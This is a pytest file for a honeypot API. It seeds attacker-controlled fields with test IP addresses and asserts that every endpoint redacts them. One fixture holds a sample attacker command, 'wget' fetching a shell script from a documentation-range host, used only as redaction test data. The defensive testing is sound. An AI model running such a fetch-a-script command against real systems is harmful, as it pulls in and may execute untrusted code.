"""Blanket privacy gate: no API response body contains an IP ADDRESS VALUE.

The sibling `test_no_src_ip_on_all_endpoints` only greps for the literal key
`src_ip`, so it cannot see an address that reaches a client as a *value* -
which is how addresses actually leak: attacker-supplied credentials, SSH
banners, payload filenames and relay destination labels, none of which were
passing through `redact_ips`.

Every attacker-controlled column is seeded here with a distinctive address, so
a regression anywhere on the serialization path fails this test by name.
"""

from __future__ import annotations

import re
from datetime import datetime, timezone
from typing import Any

import pytest
from sqlalchemy.orm import Session

from src.models.auth_attempt import AuthAttempt
from src.models.command import Command
from src.models.direct_tcpip import DirectTcpipRequest
from src.models.download import Download
from src.models.geo_location import GeoLocation
from src.models.session import Session as HoneypotSession
from src.models.ssh_client import SshClient

# Documentation-range addresses (RFC 5737 / 3849) so a hit is unmistakably ours.
LEAK_V4 = "203.0.113.77"
LEAK_V6 = "2001:db8::dead"

_IPV4 = re.compile(
    r"(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}"
    r"(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
)
_IPV6 = re.compile(r"\b(?:[0-9A-Fa-f]{1,4}:){2,}[0-9A-Fa-f]{0,4}\b")


@pytest.fixture()
def leaky_seed(db_session: Session) -> dict[str, Any]:
    """Put an IP into every attacker-controlled field the API can echo back."""
    now = datetime.now(timezone.utc)
    sess = HoneypotSession(
        id="leak-001",
        src_ip="198.51.100.9",
        src_port=44444,
        dst_ip="10.0.0.5",
        dst_port=22,
        protocol="ssh",
        started_at=now,
        sensor="sensor-1",
    )
    db_session.add(sess)
    db_session.flush()

    # Seed geo_location so geo-dependent endpoints return 200 and non-empty results.
    # merge() not add(): geo_locations.ip is the primary key, and other tests in
    # this suite commit inside the per-test transaction, so a row from an earlier
    # local run survives teardown; add() would collide.
    db_session.merge(
        GeoLocation(
            ip="198.51.100.9",
            country_code="US",
            country="United States",
            city="Ashburn",
            latitude=39.04,
            longitude=-77.49,
            asn=14618,
            as_org="Example Org",
            last_updated=now,
        )
    )
    db_session.flush()

    db_session.add_all(
        [
            AuthAttempt(
                session_id="leak-001",
                username=f"root@{LEAK_V4}",
                password=LEAK_V4,
                success=False,
                timestamp=now,
            ),
            AuthAttempt(
                session_id="leak-001",
                username="admin",
                password=f"connect {LEAK_V6} now",
                success=True,
                timestamp=now,
            ),
            Command(
                session_id="leak-001",
                input=f"wget http://{LEAK_V4}/x.sh",
                success=True,
                timestamp=now,
            ),
            Download(
                session_id="leak-001",
                url=f"http://{LEAK_V4}/{LEAK_V4}",
                sha256="f" * 64,
                timestamp=now,
            ),
            SshClient(session_id="leak-001", client_version=f"MGLNDD_{LEAK_V4}_22"),
            DirectTcpipRequest(
                session_id="leak-001",
                dst_ip=f"{LEAK_V4}.nip.io",
                dst_port=80,
                timestamp=now,
            ),
        ]
    )
    db_session.flush()
    return {"sha256": "f" * 64}


def test_no_ip_value_in_any_response(
    client: Any, get_urls: Any, leaky_seed: dict[str, Any]
) -> None:
    """No endpoint echoes back an address from any attacker-controlled field."""
    # ?country= variants aren't path/query args enumeration can infer.
    extras = [
        "/api/v1/stats/top-credentials?country=US",
        "/api/v1/stats/top-credentials?country=??",
        "/api/v1/stats/asns?country=??",
    ]
    urls = (
        get_urls(session_id="leak-001", sha256=leaky_seed["sha256"], a2="US") + extras
    )
    for url in urls:
        response = client.get(url)
        assert response.status_code == 200, f"{url} returned {response.status_code}"
        body = response.data.decode()
        assert LEAK_V4 not in body, f"{url} leaked {LEAK_V4}"
        assert LEAK_V6 not in body, f"{url} leaked {LEAK_V6}"
        found = _IPV4.findall(body)
        assert not found, f"{url} leaked IPv4 value(s): {sorted(set(found))[:5]}"


def test_seeded_rows_are_actually_reachable(
    client: Any, leaky_seed: dict[str, Any]
) -> None:
    """Guard the guard: prove the leaky rows reach responses at all.

    Without this the test above would pass just as well against empty results,
    silently protecting nothing.
    """
    detail = client.get("/api/v1/sessions/leak-001").get_json()
    assert detail["auth_attempts"], "no auth attempts reached the detail response"
    assert detail["commands"], "no commands reached the detail response"
    assert "<ip>" in detail["commands"][0]["input"]
    assert "<ip>" in detail["auth_attempts"][0]["username"]

    rows = client.get("/api/v1/stats/ssh-clients").get_json()
    banners = [r["client_version"] for r in rows]
    assert any(b and "<ip>" in b for b in banners), f"banner never blotted: {banners}"

    country_detail = client.get("/api/v1/stats/countries/US").get_json()
    assert country_detail, "country detail not reachable"

    asns = client.get("/api/v1/stats/asns").get_json()
    assert asns, "asns endpoint returned empty"

    map_data = client.get("/api/v1/stats/map").get_json()
    assert map_data, "map endpoint returned empty"
